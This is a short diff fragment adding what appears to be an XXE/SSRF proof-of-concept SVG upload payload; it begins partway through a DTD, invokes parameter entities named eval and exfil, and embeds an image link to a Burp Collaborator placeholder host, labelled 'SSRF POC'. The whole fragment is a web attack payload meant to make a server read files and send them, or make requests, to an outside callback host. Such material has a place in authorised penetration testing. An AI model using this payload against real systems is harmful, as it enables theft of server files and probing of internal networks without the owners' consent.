@@ -1,0 +1,8 @@
+"&gt;
+  %eval;
+  %exfil;
+]&gt;
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+  <image height="30" width="30" xlink:href="http://burpcollaboratorPayload"></image>
+  <text x="0" y="20" font-size="20">SSRF POC</text>
+</svg>
